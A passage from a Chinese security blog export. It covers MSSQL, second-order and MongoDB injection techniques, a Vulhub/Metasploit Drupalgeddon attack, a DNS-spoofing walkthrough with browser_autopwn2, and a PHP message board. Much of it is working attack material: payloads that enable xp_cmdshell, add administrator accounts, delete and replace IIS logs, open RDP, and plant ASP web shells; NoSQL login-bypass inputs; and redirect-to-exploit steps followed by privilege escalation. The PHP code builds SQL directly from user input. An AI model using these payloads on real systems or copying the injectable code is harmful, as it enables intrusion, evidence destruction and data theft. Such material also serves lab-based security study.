get_magic_quotes_gpc 对其中的特殊字符进行了转义，在写入数据库的时候还是保留了原来的数据，但是数据本身还是脏数据 10.2 示例10.2.1 注册脏用户 10.2.2 退出重新登录 10.2.3 留言1,(select admin_pass from admin limit 0,1),1);# 10.2.4 二次注入结果 11. MSSQL注入11.1 注入过程11.1.1 Step 1：判断注入点和mysql数据库判断方式相同 1234and 1=1and 1=2/-0 11.1.2 Step 2：判断数据库类型1234select * from sysobjects?1 and exists(select * from sysobjects)and (select count(\\*) from sysobjects)&gt;0 mssqland (select count(\\*) from msysobjects)&gt;0 access 11.1.3 Step 3：注入点权限判断1234select IS_SRVROLEMEMBER(&apos;sysadmin&apos;);select IS_SRVROLEMEMBER(&apos;db_owner&apos;);select IS_SRVROLEMEMBER(&apos;public&apos;);//有public权限可以暴破表http://target.com?id=1 and 1=(select IS_SRVROLEMEMBER(&apos;sysadmin&apos;)) 11.1.4 Step 4：信息收集1234567891011数据库版本 select @@version http://target.com?id=1 and @@version&gt;0http://target.com?id=1 and 1=(select @@version)http://target.com?id=1 and user&gt;0查询当前数据库http://target.com?id=1 and 1=（select db_name()） http://target.com?id=1 and 1=(convert(int,db_name()))db_name(n)表示第几个数据库获取其他数据库SELECT top 1 Name FROM Master..SysDatabases where name not in (&apos;master&apos;,&apos;aspcms&apos;);select DB_NAME(1); 11.1.5 Step 5：获取当前数据库下的表12select top 1 name from aspcms.sys.all_objects where type=&apos;U&apos; AND is_ms_shipped=0select top 1 name from aspcms.sys.all_objects where type=&apos;U&apos; AND is_ms_shipped=0 and name not in (&apos;AspCms_Collect_Content&apos;) 11.1.6 Step 6：获取当前数据库下指定表的字段名123如：AspCms_Userselect top 1 COLUMN_NAME from aspcms.information_schema.columns where TABLE_NAME=&apos;AspCms_User&apos;select top 1 COLUMN_NAME from aspcms.information_schema.columns where TABLE_NAME=&apos;AspCms_User&apos; and COLUMN_NAME not in (&apos;UserID&apos;,&apos;GroupID&apos;,&apos;LanguageID&apos;,&apos;SceneID&apos;,&apos;LoginName&apos;,&apos;Password&apos;) 11.1.7 Step 7：获取字段内容1234select top 1 LoginName from AspCms_Userselect top 1 Password from AspCms_Userselect top 1 LoginName from AspCms_User where LoginName not in (&apos;admin&apos;)http://target.com?id=1 and 1=(select top 1 Password from AspCms_User) 上面的都是通过类型不匹配，系统强制转换来显示数据 11.2 利用MSSQL扩展存储注入攻击11.2.1 检测与恢复扩展存储判断xp_cmdshe扩展存储是否存在1and 1=(select count(*) from master.dbo.sysobjects where xtype = &apos;x&apos; AND name = &apos;xp_cmdshell&apos;) 判断xp_regread扩展存储过程是否存在1and 1=(select count(*) from master.dbo.sysbojects where name=&apos;xp_regread&apos;) 恢复12EXEC sp_configure &apos;show advanced options&apos;,1;RECONFIGURE;EXEC sp_configure &apos;xp_cmdshell&apos;,1;RECONFIGURE;;exec sp_dropextendedproc xp_cmdshell,&apos;xplog70.dll&apos; 11.2.2 sa权限下扩展存储攻击利用方法11.2.2.1.利用xp_cmdshell扩展执行任意命令11.2.2.1.1 开启xp_cmdshell的方法12sql server20055下开启xp_cmdshellEXEC sp_configure &apos;show advanced options&apos;,1;RECONFIGURE;EXEC sp_configure &apos;xp_cmdshell&apos;,1;RECONFIGURE; 11.2.2.1.2 查看C盘1234;drop table black;create TABLE black(mulu varchar(7996) NULL,ID int NOT NULL IDENTITY(1,1))--;insert into black exec master..xp_cmdshell &apos;dir c:\\&apos;and 1= (select top 1 mulu from black where id =1) 11.2.2.1.3 新建用户12;exec master..xp_cmdshell &apos;net user test test /add&apos;;exec master..xp_cmdshell &apos;net localgroup administrators test /add&apos; 11.2.2.1.4 添加和删除一个SA权限的用户test （需要SA权限）12exec master.dbo.sp_addlogin test,passwordexec master.dbo.sp_addsrvrolemember test,sysadmin 11.2.2.1.5 停掉或激活某个服务 （需要SA权限）12exec master..xp_servicecontrol &apos;stop&apos;,&apos;schedule&apos;exec master..xp_servicecontrol &apos;start&apos;,&apos;schedule&apos; 11.2.2.1.6 爆网站目录123create table labeng(lala nvarchar(255),id int)DECLARE @result varchar(255) EXEC master.dbo.xp_regread &apos;HKEY_LOCAL_MACHINE&apos;,&apos;SYSTEM\\ControlSet001\\Services\\W3SVC\\Parameters\\Virtual Roots&apos;,&apos;/&apos;,@result output insert into labeng(lala) values(@result);and 1=(select top 1 lala from labeng)或者and 1=(select count(*) from labeng where lala&gt;1) 11.2.2.1.7 删除日志记录1;exec master.dbo.xp_cmdshell &apos;del c:\\winnt\\system32\\logfiles\\w3svc5\\ex070606.log&gt;c:\\temp.txt 11.2.2.1.8替换日志记录1;exec master.dbo.xp_cmdshell &apos;copy c:\\winnt\\system32\\logfiles\\w3svc5\\ex070404.log c:\\winnt\\system32\\logfiles\\w3svc5\\ex070606.log &gt;c:\\temp.txt&apos; 11.2.2.1.9 开启远程数据库1;select * from OPENROWSET(&apos;SQLOLEDB&apos;,&apos;server=servername;uid=sa;pwd=apachy_123&apos;,&apos;select * from table1&apos;) 11.2.2.1.10 开启远程数据库1;select * from OPENROWSET(&apos;SQLOLEDB&apos;,&apos;uid=sa;pwd=apachy_123;Network=DBMSSOCN;Address=202.100.100.1,1433;&apos;,&apos;select * from table&apos;) 11.2.2.1.11 打开338912345;exev master..xp_cmdshell &apos;sc config termservice start=auto&apos;;exec master..xp_cmdshell &apos;net start termservice&apos;;exec master..xp_cmdshell &apos;reg add &quot;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server&quot; /vfDenyTSConnection/t REG_DWORD/d 0x0 /f&apos; //允许外部连接;exec master..xp_cmdshell &apos;reg add &quot;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\TerminalServer\\WinStations\\RDP-Tcp&quot; /v PortNumber /t REG_DWORD /d 0x50 /f&apos;//端口改为80 11.2.2.1.12 利用sp_makewebtask写入一句话木马1234;exec sp_makewebtask &apos;c:\\inetpub\\wwwroot\\x.asp&apos;,&apos;select&quot;%3c%25%65%76%61%6C%20%72%65%71%75%65%73%74%28%22%63%68%6F%70%70%65%72%22%29%25%3E&quot;&apos;--http://mssql.sql.com/aspx.aspx?id=1%20;exec%20sp_makewebtask%20%20%27c:\\inetpub\\wwwroot\\ms\\x1.asp%27,%27select%27%27&lt;%execute(request(&quot;cmd&quot;))%&gt;%27%27%27--修改管理员密码update admin set password=126326 where username=&apos;admin&apos;; 11.2.3 dbowner权限下的扩展攻击利用11.2.3.1.判断数据库用户权限1and 1=(select is_member(&apos;db_owner&apos;));-- 11.2.3.2.搜索web目录1234;create table temp(dir nvarchar(255),files varchar(255),files varchar(255),ID int NOT NULL IDENTITY(1,1));--;insert into temp(dir,depth,files)exec master.dbo.xp_dirtree &apos;c:&apos;,1,1--and (select dir from temp where id=1)&gt;0//由于不能一次性获取所有目录文件和文件夹名，因此需要更改ID的值，依次列出文件和文件夹 11.2.3.3.写入一句话木马找到web目录后，就可以写入一句话木马了 123456;alter database ssdown5 set RECOVERY FULL;create table test(str image)--;backup log ssdown5 to disk=&apos;c:\\test&apos; with init--;insert into test(str) values(&apos;&lt;%excute(request(&quot;cmd&quot;))%&gt;&apos;)--;backup log ssdown5 to disk=&apos;c:\\inetpub\\wwwroot\\x.asp&apos;--;alter database ssdown5 set RECOVERY simple 12. Nosql注入NOSQL(Not Only SQL) 12.1 MongoDB介绍和使用基于分布式文件存储数据库 使用C++开发，支持跨平台，可以存储任何数据(文件)允许在服务器端执行脚本，可以用JavaScript编写某些函数使用Json形式存储数据支持的编程语言：PHP、Ruby、Python、C++、C#、Java使用db表示数据库 12.1.1 sql和nosql结构对比 sql Nosql 解释/说明 database database 数据库 table collection(记录) 数据库表/集合 row 文件 数据记录行/文件 column field 数据字段域 index index 索引 table join / 表连接，MongoDB不支持 primary key primary key 主键，MongoDB自动将_id字段设置为主键 12.1.2 MongoDB使用12.1.2.1 对数据库的操作12.1.2.1.1 创建数据库1use databasename 12.1.2.2 查看当前数据库1db 12.1.2.3 查看所有数据库12show dbsshow databases 12.1.2.4 删除数据库1db.dropDatabase() 12.1.2.2 对集合的操作12.1.2.2.1查看所有集合12show tables;show collections; 12.1.2.2.2 创建集合1db.creatCollection(&quot;collectionname&quot;) 12.1.2.2.3 创建集合并插入数据1db.collectionname.insert(&#123;key:value,key2:value2&#125;) 12.1.2.2.4 删除集合1db.collectionname.drop() 12.1.2.3 对文档的操作12.1.2.3.1 查询表中所有文档1db.collectionname.find().pretty() 12.1.2.3.2 更新文档123db.collectionname.update(&lt;query&gt;,&lt;update&gt;)&lt;query&gt; 条件&lt;update&gt; 更新内容 12.1.2.3.2.1 更新单条数据1db.collectionname.update(&#123;&quot;username&quot;:&quot;Windy&quot;&#125;,&#123;$set:&#123;&quot;age&quot;:18&#125;&#125;) 12.1.2.3.2.2更新多条数据1db.collectionname.update(&#123;&quot;username&quot;:&quot;Windy&quot;&#125;,&#123;$set:&#123;&quot;age&quot;:18&#125;&#125;,&#123;multi:true&#125;) 12.1.2.3.2.3删除数据123db.collectionname.remove()db.collectionname.remove(&#123;&quot;username&quot;:&quot;Windy&quot;&#125;)db.collectionname.deleteMany(&#123;&#125;)//删除所有文档 12.1.2.4 查询语句12.1.2.4.1 有条件查询1234567= &#123;key:value&#125; 寻找key=value的文档&lt; &#123;key:&#123;&amp;lt:value&#125;&#125;&gt; &#123;key:&#123;&amp;gt:value&#125;&#125;&lt;= &#123;key:&#123;&amp;lte:value&#125;&#125;&gt;= &#123;key:&#123;&amp;gte:value&#125;&#125;!= &#123;key:&#123;&amp;ne:value&#125;&#125;$regex 1db.collectionname.find(&#123;key:&#123;&amp;ge:value&#125;&#125;) 12.1.2.4.2 and条件1db.collectionname.find(&#123;key:&#123;$gt:value&#125;,key2:&#123;$gt:value&#125;&#125;) 12.1.2.4.3 or条件1db.collectionname.find($or:[&#123;key:&#123;$gt:value&#125;,key:&#123;&amp;lt:value&#125;&#125;]) 12.1.2.4.4 正则查询1db.collectionname.find(&#123;key:&#123;$regex:&quot;regex&quot;&#125;&#125;) 12.2 PHP操作Mongodbmongo(面向过程) mongodb(面向对象) 12.3 MongoDB 注入注入类型分类：重言式、联合查询、JavaScript注入 12.3.1 重言式(永真式)1db.users.find(&#123;&quot;username&quot;:&#123;$ne:&quot;123&quot;&#125;,&quot;password&quot;:&#123;$ne:&quot;45&quot;&#125;&#125;) 1username[$ne]=love&amp;password[$ne]=love 12.3.1.1 正则1username[$regex]=^a&amp;password[$regex]=^1 12.3.2 联合查询12.3.3 JavaScript注入12345678910function login() &#123; var username = '\".$username.\"'; var password = '\".$password.\"'; if(username == 'admin' &amp;&amp; password == '123456') return true; else&#123; return false; &#125;&#125; 账号：a&#39; return true; var a=&#39;密码：1 12.3.4 Shell拼接利用1?username=&quot;&#125;);db.messages.insert(&#123;&quot;name&quot;:&quot;wangwu&quot;&#125;);db.messages.find(&#123;&quot;author&quot;:&quot;1 1db.messages.find(&#123;&quot;author&quot;:&quot;&apos;.$username.&apos;&quot;&#125;).sort(&#123;&quot;addtime&quot;:-1&#125;); 12.4 注入实验12.4.1 重言式注入12.4.正则注入13. Tips13.1 判断数字型注入还是字符型注入12?id=1 and 1=1 #?id=1&apos; and &apos;1&apos;=&apos;1 13.2 注释在做sqli-labs-master的时候有些关可以直接使用#，有些关要将#进行URL编码写在payload中有些关可以直接使用--，有些关要将空格进行URL编码写在payload中 14. 参考[1] Sqli_labs通关文档 [2] 【学习笔记】MYSQL的floor报错原理分析总结 [3] 伪静态注入的总结 [4] are-pdo-prepared-statements-sufficient-to-prevent-sql-injection [5] 深入理解SET NAMES和mysql(i)_set_charset的区别 [6] Time-Based Blind SQL Injection using Heavy Query [7]","categories":[],"tags":[{"name":"OWASP-TOP10","slug":"OWASP-TOP10","permalink":"https://chirec.github.io/tags/OWASP-TOP10/"}]},{"title":"'Vulhub搭建漏洞环境及简单测试'","slug":"Vulhub","date":"2019-04-09T12:39:11.000Z","updated":"2019-04-11T01:31:31.620Z","comments":true,"path":"2019/04/09/Vulhub/","link":"","permalink":"https://chirec.github.io/2019/04/09/Vulhub/","excerpt":"1.Vulhub搭建1.1 docker安装12curl -s https://get.docker.com/ | sh docker -h 如果第二个命令能出现docker的帮助提示，则表示安装成功如果提示没有curl，可以按照提示安装curl不使用apt install方式安装docker是因为，如果源上的docker不是最新的，无法安装最新版本的docker。 1.2 安装docker-compose12pip install docker-composedocker-compose -v 第二个命令出现版本信息，表示安装成功。提示没有pip，安装提示安装pip 1.3 安装Vulhub1git clone https://github.com/vulhub/vulhub.git 2.搭建漏洞环境2.1 生成容器以 Drupal &lt; 7.32 “Drupalgeddon” SQL注入漏洞（CVE-2014-3704）为例 12cd /vulhub/drupal/CVE-2014-3704# docker-compose up -d","text":"1.Vulhub搭建1.1 docker安装12curl -s https://get.docker.com/ | sh docker -h 如果第二个命令能出现docker的帮助提示，则表示安装成功如果提示没有curl，可以按照提示安装curl不使用apt install方式安装docker是因为，如果源上的docker不是最新的，无法安装最新版本的docker。 1.2 安装docker-compose12pip install docker-composedocker-compose -v 第二个命令出现版本信息，表示安装成功。提示没有pip，安装提示安装pip 1.3 安装Vulhub1git clone https://github.com/vulhub/vulhub.git 2.搭建漏洞环境2.1 生成容器以 Drupal &lt; 7.32 “Drupalgeddon” SQL注入漏洞（CVE-2014-3704）为例 12cd /vulhub/drupal/CVE-2014-3704# docker-compose up -d 2.2 环境配置查看官方文档：Drupal &lt; 7.32 “Drupalgeddon” SQL注入漏洞（CVE-2014-3704） 数据库设置 邮箱设置 无法向邮箱发送邮件，没必要写可以正常使用的邮箱 3.CMSmap扫描123git clone https://github.com/Dionach/CMSmap.gitcd CMSmappython3 cmsmap.py http://192.168.126.148:8080/ 4.使用MSF攻击1234567/etc/init.d/postgresql startmsfconsolesearch drupaluse exploit/multi/http/drupal_drupageddon set rhost 192.168.126.148set rport 8080run 5.docker使用5.1 添加加速12https://www.daocloud.io/mirrorcurl -sSL https://get.daocloud.io/daotools/set_mirror.sh | sh -s http://f1361db2.m.daocloud.io 5.2 docker镜像操作1234docker search mysql //搜索docker pull 镜像名称 //下载docker images //查看本地已下载镜像docker rmi 镜像id //删除镜像 5.3 docker容器操作123456789101112docker run -d -p --name 容器名或镜像ID）-d 后台运行-p 随机分配端口-p 端口1（宿主机）:端口2（容器中）//端口转发docker ps //查看当前处于运行状态的容器docker start 容器ID或容器名 //开启容器docker stop 容器ID或容器名 //停止运行中的容器docker ps -a //查看停止的容器docker rm 容器ID或容器名 //删除容器docker exec -it 容器ID或容器名 /bin/bash //进入容器内部docker save 容器名/容器ID &gt; test.tar //导出容器docker load &lt; test.tar //导入容器 5.4 加入docker组安装完成之后，普通用户每次执行docker命令都需要加上sudo ，所以我们可以加入doker用户组获取操作权限 1.使用有sudo权限的帐号登录系统2.创建docker分组，并将相应的用户添加到这个分组里面3.退出，然后重新登录，以便让权限生效 1sudo usermod -aG docker your_username 6.参考[1] 一键安装Docker [2] 启动漏洞环境","categories":[],"tags":[]},{"title":"'使用Ettercap和MSF模块进行DNS欺骗，并植入后门'","slug":"I-Want-to-see-U","date":"2019-04-08T11:01:44.000Z","updated":"2019-04-08T12:36:49.959Z","comments":true,"path":"2019/04/08/I-Want-to-see-U/","link":"","permalink":"https://chirec.github.io/2019/04/08/I-Want-to-see-U/","excerpt":"1.工具介绍1.1Ettercap Ettercap是一个全面中间人攻击工具。它具有实时连接嗅探、动态内容过滤和许多其他有趣的功能。它支持对许多协议的主动和被动分析，并包含许多用于网络和主机分析的特性。 1.2MSF模块：browser_autopwn2 browser_autopwn2是Metasploit提供的辅助功能模块。在受害者访问Web页面时，它会自动攻击受害者的浏览器。在开始攻击之前，browser_autopwn2能够检测用户使用的浏览器类型， browser_autopwn2将根据浏览器的检测结果，自行选择最合适的EXP。 2.实验环境 角色 系统版本 IP 备注 靶机 Windows Server 2003 192.168.126.149 无 攻击机 Kali Linux 64 bit 2019.1a 192.168.126.126 无","text":"1.工具介绍1.1Ettercap Ettercap是一个全面中间人攻击工具。它具有实时连接嗅探、动态内容过滤和许多其他有趣的功能。它支持对许多协议的主动和被动分析，并包含许多用于网络和主机分析的特性。 1.2MSF模块：browser_autopwn2 browser_autopwn2是Metasploit提供的辅助功能模块。在受害者访问Web页面时，它会自动攻击受害者的浏览器。在开始攻击之前，browser_autopwn2能够检测用户使用的浏览器类型， browser_autopwn2将根据浏览器的检测结果，自行选择最合适的EXP。 2.实验环境 角色 系统版本 IP 备注 靶机 Windows Server 2003 192.168.126.149 无 攻击机 Kali Linux 64 bit 2019.1a 192.168.126.126 无 3.实验过程3.1使用Ettercap进行DNS欺骗DNS欺骗过程和使用Ettercap和SET进行DNS欺骗、钓鱼过程相同，可以查看这篇文章。注意：进行DNS欺骗后，要开启Apache2服务才可以正常访问。上一篇中，SET自动开启了80端口，所以不需要开启Apache2服务。开启Apache2服务命令 12/etc/init.d/apache2 start/etc/init.d/apache2 status 3.2MSF模块生成恶意URL123456/etc/init.d/postgresql startmsfdb initmsfconsolesearch browser_autopwn2use auxiliary/server/browser_autopwn2run 没有什么需要修改的设置，使用模块之后，直接run就可以生成恶意URL了 3.3添加跳转脚本生成URL过程比较慢，这段时间我们给主页添加跳转脚本 1234&lt;script language=&quot;javascript&quot; type=&quot;text/javascript&quot;&gt; // 以下方式定时跳转setTimeout(&quot;javascript:location.href=&apos;Hello！&apos;&quot;, 1000); &lt;/script&gt; 将上方代码中的Hello！替换为MSF生成的恶意URL即可。 3.4靶机访问访问www.baidu.com，可以看到访问的是刚刚写的index.html 自动跳转到恶意URL 3.5测试结果在靶机访问恶意URL之后，MSF开始根据浏览器版本选择使用EXP并创建会话 3.6启动会话MSF创建会话之后，我们需要手动启用会话 1sessions -l 1sessions -i 1 123getuidgetsystemgetuid 4.参考[1] MSF自动化浏览器攻击与后门安装","categories":[],"tags":[]},{"title":"'使用PHP编写留言板Version2.0'","slug":"Create-Message-Board-with-PHP-Version-2-0","date":"2019-03-29T08:37:23.000Z","updated":"2019-03-31T07:40:39.172Z","comments":true,"path":"2019/03/29/Create-Message-Board-with-PHP-Version-2-0/","link":"","permalink":"https://chirec.github.io/2019/03/29/Create-Message-Board-with-PHP-Version-2-0/","excerpt":"1.改进在上一篇使用PHP编写留言板的结尾处，写了留言板的不足之处。经过一周的PHP学习，打算重新写一遍留言板，对之前的不足做出改进。 1.1删除功能新的留言板添加了编辑选项，可以修改留言内容或删除留言。 1.2重复提交新的留言板添加了session，而且在提交表单之后会自动跳转到留言板的主页，从而解决了重复提交的Bug。 1.3时间显示问题在上一篇其实已经写出了解决方案，新的留言板会使用上次的方案来解决时间显示问题。","text":"1.改进在上一篇使用PHP编写留言板的结尾处，写了留言板的不足之处。经过一周的PHP学习，打算重新写一遍留言板，对之前的不足做出改进。 1.1删除功能新的留言板添加了编辑选项，可以修改留言内容或删除留言。 1.2重复提交新的留言板添加了session，而且在提交表单之后会自动跳转到留言板的主页，从而解决了重复提交的Bug。 1.3时间显示问题在上一篇其实已经写出了解决方案，新的留言板会使用上次的方案来解决时间显示问题。 2.功能介绍2.1删除留言123456789101112131415&lt;?php session_start(); if(empty($_SESSION[&apos;userName&apos;]))&#123; header(&quot;location:login_page.php&quot;); &#125; $userName=$_SESSION[&apos;userName&apos;]; $message_ID=$_GET[&apos;id&apos;]; $ip=&quot;localhost&quot;; $account=&quot;root&quot;; $password=&quot;root&quot;; $connect=new pdo(&quot;mysql:host=$ip;dbname=MessageBoard&quot;,$account,$password); $query=&quot;delete from messages where ID=$message_ID;&quot;; $res=$connect-&gt;prepare($query); $res-&gt;execute();?&gt; 删除功能的实现，是通过在编辑页面点击链接时使用GET方式传入留言的ID，获得留言的ID后，通过PDO操作数据库删除留言。 2.2登陆1234567891011121314151617181920212223242526272829303132&lt;?php session_start(); header(&quot;Content-Type:text/html; charset=utf-8&quot;); $ip=&quot;localhost&quot;; $account=&quot;root&quot;; $password=&quot;root&quot;; //连接MySQL数据库 try&#123; //连接数据库 $connect=new pdo(&quot;mysql:host=$ip;dbname=MessageBoard&quot;,$account,$password); echo &quot;Connect successed.&quot;.&quot;&lt;br&gt;&quot;; //用户提交登陆信息 $userName=$_POST[&apos;userName&apos;]; $pwd=$_POST[&apos;password&apos;]; //数据库查询语句 $query=&quot;select Password from user where userName=&apos;$userName&apos;&quot;; // $res=$connect-&gt;prepare($query); $res-&gt;execute(); $result=$res-&gt;fetch(PDO::FETCH_ASSOC); if($pwd==$result[&apos;Password&apos;])&#123; echo &quot;登陆成功&quot;; $_SESSION[&apos;userName&apos;]=$userName; header(&quot;location:home.php&quot;); &#125;else&#123; echo &quot;登陆失败&quot;; &#125; &#125;catch(PDOException $error)&#123; echo &quot;Connect failed.&quot;.$error-&gt;getmessage(); &#125; $connect=NULL;?&gt; 2.3退出123456&lt;?php session_start(); unset($_SESSION[&apos;userName&apos;]); session_destroy(); header(&quot;location:login_page.php&quot;); ?&gt; 2.4发布留言123456789101112131415161718192021&lt;?php session_start(); if(empty($_SESSION[&apos;userName&apos;]))&#123; header(&quot;location:login_page.php&quot;); &#125; $userName=$_SESSION[&apos;userName&apos;];?&gt;&lt;?php $ip=&quot;localhost&quot;; $account=&quot;root&quot;; $password=&quot;root&quot;; $connect=new pdo(&quot;mysql:host=$ip;dbname=MessageBoard&quot;,$account,$password); $receiver=$_POST[&apos;receiver&apos;]; $time=date(&quot;Y-m-d H-i-s&quot;); $content=$_POST[&apos;content&apos;]; $query=&quot;insert into `messages` (sender,receiver,time,content) values(&apos;$userName&apos;,&apos;$receiver&apos;,&apos;$time&apos;,&apos;$content&apos;);&quot;; $res=$connect-&gt;prepare($query); $res-&gt;execute(); $connect=NULL; header(&quot;location:home.php&quot;);?&gt; 2.5注册1234567891011121314151617181920212223242526272829303132&lt;?php header(&quot;Content-Type:text/html; charset=utf-8&quot;); $ip=&quot;localhost&quot;; $account=&quot;root&quot;; $password=&quot;root&quot;; //连接MySQL数据库 try&#123; //连接数据库 $connect=new pdo(&quot;mysql:host=$ip;dbname=MessageBoard&quot;,$account,$password); echo &quot;Connect successed.&quot;.&quot;&lt;br&gt;&quot;; //用户提交登陆信息 $userName=$_POST[&apos;userName&apos;]; $pwd=$_POST[&apos;password&apos;]; $Name=$_POST[&apos;Name&apos;]; //数据库查询语句 $query=&quot;insert into `user` (userName,Password,Name) value(&apos;$userName&apos;,&apos;$pwd&apos;,&apos;$Name&apos;);&quot;; // if($_POST[&apos;userName&apos;]==&quot;&quot;or$_POST[&apos;password&apos;]==&quot;&quot;or$_POST[&apos;Name&apos;]==&quot;&quot;)&#123; echo &quot;不能为空&quot;; &#125;else&#123; $res=$connect-&gt;exec($query); if($res!=0)&#123; echo &quot;注册成功&quot;; &#125;else&#123; echo &quot;注册失败&quot;; &#125; &#125; &#125;catch(PDOException $error)&#123; echo &quot;Connect failed.&quot;.$error-&gt;getmessage(); &#125; $connect=NULL;?&gt; 2.6编辑留言123456789101112131415161718192021&lt;?php session_start(); if(empty($_SESSION['userName']))&#123; header(\"location:login_page.php\"); &#125; $userName=$_SESSION['userName']; $message_ID=$_POST['ID']; $ip=\"localhost\"; $account=\"root\"; $password=\"root\"; $receiver=$_POST['receiver']; $time=date(\"Y-m-d H-i-s\"); $content=$_POST['content']; $ID=$_POST['ID']; $connect=new pdo(\"mysql:host=$ip;dbname=MessageBoard\",$account,$password); $query=\"update `messages` set receiver='$receiver',time='$time',content='$content' where ID='$ID';\"; $res=$connect-&gt;prepare($query); $res-&gt;execute(); $connect=NULL; header(\"location:home.php\");?&gt; 编辑留言功能实现的方式和删除留言的一样的，都是通过在编辑页面使用GET方式将留言ID传入到编辑留言页面，再通过一个隐藏的表单将留言ID所使用POST方式传入到编辑页面功能中，然后再使用PDO操作数据库编辑留言。 2.7Session1234567session_start();$_SESSEION['userName']=$userName;if(empty($_SESSION['userName']))&#123; header(\"location:login_page.php\"); &#125;unset($_SESSION['userName'];session_destory(); 2.7.1session_start()在把用户信息存储在$_SESSION数组之前，必须先启动会话。session_start()就是启动会话的函数。session_start()这个函数一般写在最开始的地方，在&lt;html&gt;标签之前即可。 2.7.2存储或取回session变量存储或取回都需要使用到$_SESSION变量。上面的代码中，将用户登录名（userName）存储到了$_SESSION中，在后面比对是也使用的是userName。 2.7.3简单的登陆判断使用if判断$_SESSION[‘userName’]是否为空来判断用户是否已经登陆，如果$_SESSION[‘userName’]为空，则跳转到登陆页面。 2.7.4删除session数据unset($_SESSION[‘userName’])和session_destory()都可以实现删除session数据的操作。在退出功能中写入，可以确保用户退出留言板。 3.数据库MessageBoard数据库有2个表，user表存放用户的注册信息，messages存放用户发布的留言。 3.1user表结构 3.2messages表结构 4.显示页面4.1编辑页面123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051&lt;!DOCTYPE html&gt;&lt;?php session_start(); if(empty($_SESSION[&apos;userName&apos;]))&#123; header(&quot;location:login_page.php&quot;); &#125; $userName=$_SESSION[&apos;userName&apos;];?&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;编辑留言&lt;/title&gt; &lt;meta charset=&quot;utf-8&quot;&gt;&lt;/head&gt;&lt;body&gt; &lt;h1&gt;编辑留言&lt;/h1&gt; &lt;?php echo &quot;欢迎&quot;.$userName; ?&gt; &lt;a href=&quot;home.php&quot;&gt;返回留言板&lt;/a&gt; &lt;a href=&quot;send_message_page.php&quot;&gt;发送留言&lt;/a&gt; &lt;a href=&quot;logout.php&quot;&gt;退出留言板&lt;/a&gt; &lt;table&gt; &lt;tr&gt; &lt;th&gt;发送人&lt;/th&gt; &lt;th&gt;接收人&lt;/th&gt; &lt;th&gt;发送时间&lt;/th&gt; &lt;th&gt;留言内容&lt;/th&gt; &lt;th&gt;删除&lt;/th&gt; &lt;th&gt;编辑&lt;/th&gt; &lt;/tr&gt; &lt;?php $ip=&quot;localhost&quot;; $account=&quot;root&quot;; $password=&quot;root&quot;; $connect=new pdo(&quot;mysql:host=$ip;dbname=MessageBoard&quot;,$account,$password); $query=&quot;select * from messages where sender=&apos;$userName&apos;;&quot;; $res=$connect-&gt;prepare($query); $res-&gt;execute(); while ($result=$res-&gt;fetch(PDO::FETCH_ASSOC)) &#123; $message_ID=$result[&apos;ID&apos;]; echo &quot;&lt;tr&gt;&quot;; echo &quot;&lt;td&gt;&quot;.$result[&apos;sender&apos;].&quot;&lt;/td&gt;&quot;; echo &quot;&lt;td&gt;&quot;.$result[&apos;receiver&apos;].&quot;&lt;/td&gt;&quot;; echo &quot;&lt;td&gt;&quot;.$result[&apos;time&apos;].&quot;&lt;/td&gt;&quot;; echo &quot;&lt;td&gt;&quot;.$result[&apos;content&apos;].&quot;&lt;/td&gt;&quot;; echo &quot;&lt;td&gt;&lt;a href=&apos;delete_message.php?id=$message_ID&apos;&gt;删除此条留言&lt;/a&gt;&lt;/td&gt;&quot;; echo &quot;&lt;td&gt;&lt;a href=&apos;update_message_page.php?id=$message_ID&apos;&gt;编辑此条留言&lt;/a&gt;&lt;/td&gt;&quot;; echo &quot;&lt;/tr&gt;&quot;; &#125; ?&gt; &lt;/table&gt;&lt;/body&gt;&lt;/html&gt; 使用GET方式通过&lt;a&gt;标签将留言ID发送到对应功能或页面。 4.2主页面（显示留言）12345678910111213141516171819202122232425262728293031323334353637383940414243444546&lt;!DOCTYPE html&gt;&lt;?php session_start(); if(empty($_SESSION[&apos;userName&apos;]))&#123; header(&quot;location:login_page.php&quot;); &#125; $userName=$_SESSION[&apos;userName&apos;];?&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;留言板&lt;/title&gt; &lt;meta charset=&quot;utf-8&quot;&gt;&lt;/head&gt;&lt;body&gt; &lt;h1&gt;留言板&lt;/h1&gt; &lt;?php echo &quot;欢迎&quot;.$userName; ?&gt; &lt;a href=&quot;logout.php&quot;&gt;退出留言板&lt;/a&gt; &lt;a href=&quot;send_message_page.php&quot;&gt;发送留言&lt;/a&gt; &lt;a href=&quot;edit_message_page.php&quot;&gt;编辑留言&lt;/a&gt; &lt;table border=1&gt; &lt;tr&gt; &lt;th&gt;发送人&lt;/th&gt; &lt;th&gt;接收人&lt;/th&gt; &lt;th&gt;发送时间&lt;/th&gt; &lt;th&gt;留言内容&lt;/th&gt; &lt;/tr&gt; &lt;?php $ip=&quot;localhost&quot;; $account=&quot;root&quot;; $password=&quot;root&quot;; $connect=new pdo(&quot;mysql:host=$ip;dbname=MessageBoard&quot;,$account,$password); $query=&quot;select * from messages where sender=&apos;$userName&apos; or receiver=&apos;$userName&apos; or receiver=&apos;all&apos;;&quot;; $res=$connect-&gt;prepare($query); $res-&gt;execute(); while ($result=$res-&gt;fetch(PDO::FETCH_ASSOC)) &#123; echo &quot;&lt;tr&gt;&quot;; echo &quot;&lt;td&gt;&quot;.$result[&apos;sender&apos;].&quot;&lt;/td&gt;&quot;; echo &quot;&lt;td&gt;&quot;.$result[&apos;receiver&apos;].&quot;&lt;/td&gt;&quot;; echo &quot;&lt;td&gt;&quot;.$result[&apos;time&apos;].&quot;&lt;/td&gt;&quot;; echo &quot;&lt;td&gt;&quot;.$result[&apos;content&apos;].&quot;&lt;/td&gt;&quot;; echo &quot;&lt;/tr&gt;&quot;; &#125; ?&gt; &lt;/table&gt;&lt;/body&gt;&lt;/html&gt; 4.3登陆页面123456789101112131415161718192021&lt;!DOCTYPE html&gt;&lt;?php session_start(); ?&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;留言板&lt;/title&gt; &lt;meta charset=&quot;utf-8&quot;&gt;&lt;/head&gt;&lt;body&gt; &lt;h1&gt;留言板&lt;/h1&gt; &lt;a href=&quot;signup_page.php&quot;&gt;注册&lt;/a&gt; &lt;form action=&quot;login.php&quot; method=&quot;POST&quot;&gt; 用户名：&lt;input 